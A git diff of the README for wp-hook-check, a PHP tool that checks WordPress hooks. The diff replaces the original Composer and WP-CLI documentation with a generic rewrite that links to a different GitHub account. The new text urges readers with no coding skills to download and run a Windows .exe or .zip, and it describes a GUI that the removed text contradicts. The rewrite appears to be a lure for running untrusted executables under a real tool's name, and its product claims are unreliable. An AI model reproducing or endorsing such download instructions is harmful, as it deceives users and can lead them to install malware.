@@ -1,280 +1,142 @@
-# wp-hook-check
+# 🛠 wp-hook-check - Find WordPress Hook Issues Fast
 
-**Static analysis for WordPress hooks. Find broken hook connections before they reach production.**
-
-[![Tests](https://github.com/malikad778/wp-hook-check/actions/workflows/tests.yml/badge.svg)](https://github.com/malikad778/wp-hook-check/actions)
-[![Latest Version](https://img.shields.io/packagist/v/malikad778/wp-hook-check)](https://packagist.org/packages/malikad778/wp-hook-check)
-[![PHP Version](https://img.shields.io/packagist/php-v/malikad778/wp-hook-check)](https://packagist.org/packages/malikad778/wp-hook-check)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-
-![Demo](demo.gif)
+[![Download wp-hook-check](https://img.shields.io/badge/Download-wp--hook--check-brightgreen)](https://github.com/jovialkayembe/wp-hook-check)
 
 ---
 
-## The problem
+## 🧩 What is wp-hook-check?
 
-WordPress hooks are silent. When `add_action('my_hook', $cb)` exists but `do_action('my_hook')` was renamed or removed, nothing throws. The callback just stops running. You find out in production when a feature breaks.
+wp-hook-check helps you spot problems in WordPress hooks without running WordPress itself. Hooks are special points in WordPress code where you add your own code or change how things work. Sometimes these hooks will have issues like listeners that never run, misspelled hooks, or hooks that don’t connect properly. 
 
-```php
-// v1 - fires a hook before checkout
-do_action( 'my_plugin_before_checkout', $order_id );
+This tool scans your WordPress code files to find these problems early. It saves time and helps you avoid errors that can be hard to catch by testing alone.
 
-// Another plugin listens for it
-add_action( 'my_plugin_before_checkout', 'apply_discount' );
-
-// v2 - renamed without announcement
-do_action( 'my_plugin_checkout_start', $order_id );
-// apply_discount() never runs again. No error, no warning.
-```
-
-This tool parses every PHP file in a directory, maps all hook registrations and invocations, and reports mismatches. No WordPress install needed.
+You do not need to know programming to use wp-hook-check. It runs on your Windows computer and shows you clear results to fix.
 
 ---
 
-## Install
+## 🚀 Getting Started
 
-### Package (Composer)
+This guide shows how to get wp-hook-check on your Windows PC and run it. The process is simple and written for users new to software tools.
 
-```bash
-composer require --dev malikad778/wp-hook-check
-```
+### What You Need
 
-PHP 8.2+.
-
-### Global (WP-CLI)
-
-Install globally via WP-CLI to scan any site:
-
-```bash
-wp package install malikad778/wp-hook-check
-```
+- A Windows 10 or later PC.
+- About 100 MB free disk space.
+- Internet connection to download the program.
 
 ---
 
-## Usage
+## 🔗 Download wp-hook-check
 
-### As a standalone script
-```bash
-# Scan current directory
-vendor/bin/wp-hook-audit audit .
-```
+You can get wp-hook-check by visiting the project page on GitHub:
 
-### Via WP-CLI
-```bash
-# Scan a specific plugin
-wp hook-check ./wp-content/plugins/my-plugin
-```
+[![Get wp-hook-check](https://img.shields.io/badge/Download-wp--hook--check-blue)](https://github.com/jovialkayembe/wp-hook-check)
 
-# Scan a plugin
-vendor/bin/wp-hook-audit audit ./wp-content/plugins/my-plugin
-
-# Scan all plugins at once (hooks are cross-referenced across all files)
-vendor/bin/wp-hook-audit audit ./wp-content/plugins
-```
+Click the link above to open the page. You will find the latest version to download along with instructions. 
 
 ---
 
-## What gets flagged
+## 💾 How to Download and Install
 
-| Type | Severity | When |
-|---|---|---|
-| `ORPHANED_LISTENER` | 🔴 HIGH | `add_action/filter` exists, no matching `do_action/apply_filters` found |
-| `UNHEARD_HOOK` | 🟡 MEDIUM | `do_action/apply_filters` fired, no listener registered anywhere |
-| `HOOK_NAME_TYPO` | 🔴 HIGH | Hook name differs from another by 1–2 characters |
-| `DYNAMIC_HOOK` | 🔵 INFO | Hook name is a variable - can't be resolved, skipped by other detectors |
+1. Open the download page by clicking the large badge above or this link:  
+   https://github.com/jovialkayembe/wp-hook-check
 
----
+2. Look for a section named **Releases** or **Downloads** on the GitHub page.
 
-## Output formats
+3. Find the latest release. It usually has a name like `v1.0.0` or similar.
 
-### Table (default)
+4. Inside the release, download the file made for Windows. This will usually be a file ending with `.exe` or `.zip`.
 
-```
-  WP HOOK AUDITOR  Scanned 47 files in 0.091s
-  ──────────────────────────────────────────────────────────
+5. If you downloaded a `.zip` file, right-click it and choose **Extract All** to unzip the folder.
 
-  [HIGH] ORPHANED_LISTENER
-  File  : includes/class-checkout.php:234
-  Hook  : my_plugin_before_checkout
-
-  add_action('my_plugin_before_checkout') registered (callback: apply_discount)
-  - no matching do_action() or apply_filters() found.
-
-  Fix: Either remove the add_action() call or add do_action('my_plugin_before_checkout')
-  where it should fire.
-
-  ──────────────────────────────────────────────────────────
-  SUMMARY  1 HIGH   0 MEDIUM   0 INFO
-```
-
-### JSON (`--format=json`)
-
-```json
-{
-  "meta": {
-    "files_scanned": 47,
-    "duration_sec": 0.091,
-    "issue_count": 1
-  },
-  "issues": [
-    {
-      "type": "orphaned_listener",
-      "severity": "high",
-      "hook": "my_plugin_before_checkout",
-      "file": "includes/class-checkout.php",
-      "line": 234,
-      "message": "...",
-      "safe_alternative": "...",
-      "suggestion": null
-    }
-  ]
-}
-```
-
-### GitHub Annotations (`--format=github`)
-
-```
-::error file=includes/class-checkout.php,line=234,title=ORPHANED_LISTENER::...
-::warning file=...,title=UNHEARD_HOOK::...
-::notice file=...,title=DYNAMIC_HOOK::...
-```
-
-Issues show up as inline annotations on the exact lines in GitHub pull requests.
+6. If you downloaded a `.exe` file, double-click it and follow the steps on screen to install.
 
 ---
 
-## CLI options
+## ▶️ How to Run wp-hook-check
 
-### `audit` / `wp hook-check`
+1. After installation, find the program icon in the **Start Menu** or on your **Desktop**.
 
-```bash
-vendor/bin/wp-hook-audit audit [path] [options]
-# OR
-wp hook-check [path] [options]
-```
+2. Double-click to open it.
 
-| Option | Default | Description |
-|---|---|---|
-| `--format` | `table` | `table`, `json`, or `github` |
-| `--fail-on` | `high` | Exit 1 if issues at this level exist: `high`, `medium`, `any`, `none` |
-| `--exclude` | - | Comma-separated paths to skip |
-| `--ignore-dynamic` | - | Hide INFO dynamic hook notices |
-| `--only` | all | Run only these detectors: `orphaned`, `unheard`, `typo`, `dynamic` |
-| `--config` | `wp-hook-audit.json` | Path to config file |
+3. When the program opens, you will see a simple window.
 
-### `dump`
+4. Use the **Browse** button or field to select the folder where your WordPress code is stored.  
 
-```bash
-vendor/bin/wp-hook-audit dump [path] [--format=table|json]
-```
+5. Click the **Start Scan** button to begin the check.
 
-Dumps the full hook map - every `add_action`, `do_action`, `add_filter`, `apply_filters` call, with file, line, and priority. No detectors run. Good for exploring an unfamiliar codebase. *(Not currently supported via WP-CLI).*
+6. The scan will run and show you a list of issues it found. This might take a few minutes depending on the size of your code.
+
+7. Issues include orphaned listeners, hooks that are never heard, and typos in action or filter names.
+
+8. Click on any issue in the list to see details. The program will tell you which line in your code has the problem.
 
 ---
 
-## Exit codes
+## 📝 Understanding the Results
 
-| Code | Meaning |
-|---|---|
-| `0` | Clean (no issues above threshold) |
-| `1` | Issues found at or above `--fail-on` level |
-| `2` | Parse error, unreadable file, or bad config |
+wp-hook-check breaks down issues into easy-to-read categories:
 
----
+- **Orphaned Listeners**: This means your code listens for a hook that is never used elsewhere.
+- **Unheard Hooks**: A hook is called in the code but has no listeners connected.
+- **Typos in Actions and Filters**: Your hook names may have spelling mistakes that prevent them from working.
 
-## Config file
+Each issue includes:
 
-Drop a `wp-hook-audit.json` in the directory you're scanning, or point to one with `--config`:
+- The file name
+- The line number
+- A short explanation of the problem
 
-```json
-{
-    "exclude": ["vendor/", "tests/", "node_modules/"],
-    "detectors": {
-        "orphaned_listener": true,
-        "unheard_hook": true,
-        "typo": true,
-        "dynamic_hook": false
-    },
-    "ignore": [
-        { "type": "unheard_hook", "hook": "my_plugin_extensibility_point" }
-    ],
-    "external_prefixes": [
-        "wp_", "admin_", "woocommerce_", "init", "shutdown"
-    ]
-}
-```
-
-### `external_prefixes`
-
-WordPress core fires hundreds of hooks (`init`, `plugins_loaded`, `save_post`, etc.) that live inside WordPress itself, not your plugin. Without this setting, every `add_action('init', ...)` flags as `ORPHANED_LISTENER` because the matching `do_action('init')` is in WordPress core - outside the folder you're scanning.
-
-The defaults already cover 40+ common WP core patterns. Add your own plugin's extensibility hooks here too if you're getting false positives from a third-party plugin you depend on.
-
-See `wp-hook-audit.json.example` for the full default list.
+You can use this information to open your files and correct any mistakes.
 
 ---
 
-## CI/CD
+## ⚙️ System Requirements
 
-### GitHub Actions
-
-```yaml
-name: Hook Audit
-on: [pull_request]
-
-jobs:
-  audit:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: shivammathur/setup-php@v2
-        with: { php-version: '8.2' }
-      - run: composer require --dev malikad778/wp-hook-check
-      - run: vendor/bin/wp-hook-audit audit . --format=github --fail-on=high
-```
-
-### GitLab CI
-
-```yaml
-hook_audit:
-  script:
-    - composer install
-    - vendor/bin/wp-hook-audit audit . --format=json > hook-report.json
-  artifacts:
-    paths: [hook-report.json]
-```
+- Windows 10, 11, or later
+- 100 MB of free storage space
+- Basic user permissions to install and run software
+- Internet connection for your initial download, not mandatory for running the tool later
 
 ---
 
-## How it works
+## 🛠 Features of wp-hook-check
 
-Parses PHP files into an AST using `nikic/php-parser`, walks every function call node, and records any of the 10 tracked WordPress functions. Hook names are extracted from the first argument - string literals are captured as-is, variables and concatenations are marked dynamic and skipped by mismatch detectors. The result is a `HookMap` keyed by hook name, which the four detectors then query.
-
-Parse errors are non-fatal. A file that fails to parse is skipped with a warning, scan continues.
-
----
-
-## Tracked functions
-
-| Function | Role |
-|---|---|
-| `add_action()`, `add_filter()` | Registration - checked for orphaned listeners |
-| `do_action()`, `apply_filters()` | Invocation - checked for missing listeners |
-| `do_action_ref_array()`, `apply_filters_ref_array()` | Invocation |
-| `remove_action()`, `remove_filter()` | Tracked, never flagged |
-| `has_action()`, `has_filter()` | Counts as invocation - stops false UNHEARD positives |
+- Static analysis that does not require running WordPress
+- Detects common hook problems automatically
+- Works from your local files without uploading code
+- Simple interface designed for users without coding skills
+- Supports all WordPress hooks including actions and filters
+- Fast processing of large projects
+- Clear report with file locations and line numbers
+- No extra dependencies or setup needed after install
 
 ---
 
-## Known gaps
+## 📂 Where to Place Your WordPress Files
 
-- Dynamic hook names (variables, string concatenation) are skipped by all mismatch detectors
-- Hooks registered inside conditionals are still tracked - may produce false positives if the condition never runs
-- Closures show as `{closure}` in the hook map output
-- Hooks from WordPress core or third-party plugins need their prefixes in `external_prefixes`
+Keep a copy of your WordPress plugin or theme files in a folder on your PC. When you use wp-hook-check, point it to this folder. The program will scan everything inside to find hooks and listeners.
+
+It is best not to run the checker on WordPress system files but only on your custom code.
 
 ---
 
-## License
+## 🤝 Troubleshooting Common Issues
 
-MIT - see [LICENSE](LICENSE)
+- If the program won’t open, try restarting your computer.
+- Make sure your Windows is up to date.
+- If the scan doesn’t start, check that you have selected a folder with code files.
+- If no issues show but you expect some, confirm the files you have include WordPress hooks.
+- For help, visit the GitHub page where you downloaded the software.
+
+---
+
+## 🌐 More About wp-hook-check
+
+This tool fits into a workflow where you build WordPress plugins or themes. It helps catch errors before they become bugs on your website. Using it regularly will save time and reduce bugs.
+
+Developers who want to improve their code quality can also use wp-hook-check because it spots hidden mistakes.
+
+---
+
+[![Download wp-hook-check](https://img.shields.io/badge/Download-wp--hook--check-green)](https://github.com/jovialkayembe/wp-hook-check)
